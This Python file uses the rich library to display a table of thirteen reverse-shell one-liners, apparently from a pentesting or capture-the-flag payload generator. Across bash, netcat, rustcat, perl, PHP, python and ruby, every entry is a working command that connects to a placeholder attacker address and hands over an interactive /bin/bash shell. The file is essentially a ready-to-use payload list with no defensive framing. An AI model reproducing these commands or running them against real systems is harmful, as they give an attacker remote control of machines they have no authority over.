from rich.console import Console
from rich.table import Table
from rich import box

def the_list():
    console = Console()
    table = Table(show_header=True, header_style="bold cyan2", box=box.DOUBLE)
    table.add_column("ID")
    table.add_column("Name")
    table.add_column("Preview")
    table.add_row(
        "[bold]1",
        "[bold]bash tcp",
        "[orchid]/bin/bash[/] -i >& /dev/tcp/[light_green]10.10.10.10[/]/[light_green]1000[/] 0>&1"
    )
    table.add_row(
        "[bold]2",
        "[bold]bash udp",
        "[orchid]/bin/bash[/] -i >& /dev/udp/[light_green]10.10.10.10[/]/[light_green]1000[/] 0>&1"
    )
    table.add_row(
        "[bold]3",
        "[bold]nc -c",
        "nc -c [orchid]/bin/bash[/] [light_green]10.10.10.10 1000[/]"
    )
    table.add_row(
        "[bold]4",
        "[bold]nc -e",
        "nc -e [orchid]/bin/bash[/] [light_green]10.10.10.10 1000[/]"
    )
    table.add_row(
        "[bold]5",
        "[bold]nc mkfifo",
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|[orchid]/bin/bash[/] -i 2>&1|nc [light_green]10.10.10.10 1000[/] >/tmp/f"
    )
    table.add_row(
        "[bold]6",
        "[bold]rustcat",
        "rcat [light_green]10.10.10.10 1000[/] -r [orchid]/bin/bash[/]"
    )
    table.add_row(
        "[bold]7",
        "[bold]perl",
        "perl -e 'use Socket;$i=\"[light_green]10.10.10.10[/]\";$p=[light_green]1000[/];socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"[orchid]/bin/bash[/] -i\");};'"
    )
    table.add_row(
        "[bold]8",
        "[bold]PHP exec",
        "php -r '$sock=fsockopen(\"[light_green]10.10.10.10[/]\",[light_green]1000[/]);exec(\"[orchid]/bin/bash[/] <&3 >&3 2>&3\");'"
    )
    table.add_row(
        "[bold]9",
        "[bold]PHP shell_exec",
        "php -r '$sock=fsockopen(\"[light_green]10.10.10.10[/]\",[light_green]1000[/]);shell_exec(\"[orchid]/bin/bash[/] <&3 >&3 2>&3\");'"
    )
    table.add_row(
        "[bold]10",
        "[bold]PHP passthru",
        "php -r '$sock=fsockopen(\"[light_green]10.10.10.10[/]\",[light_green]1000[/]);passthru(\"[orchid]/bin/bash[/] <&3 >&3 2>&3\");'"
    )
    table.add_row(
        "[bold]11",
        "[bold]python2 -c",
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[light_green]10.10.10.10[/]\",[light_green]1000[/]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"[orchid]/bin/bash[/]\")'"
    )
    table.add_row(
        "[bold]12",
        "[bold]python3 -c",
        "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[light_green]10.10.10.10[/]\",[light_green]1000[/]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"[orchid]/bin/bash[/]\")'"
    )
    table.add_row(
        "[bold]13",
        "[bold]ruby no-sh",
        "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"[light_green]10.10.10.10[/]\",\"[light_green]1000[/]\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'"
    )

    console.print(table)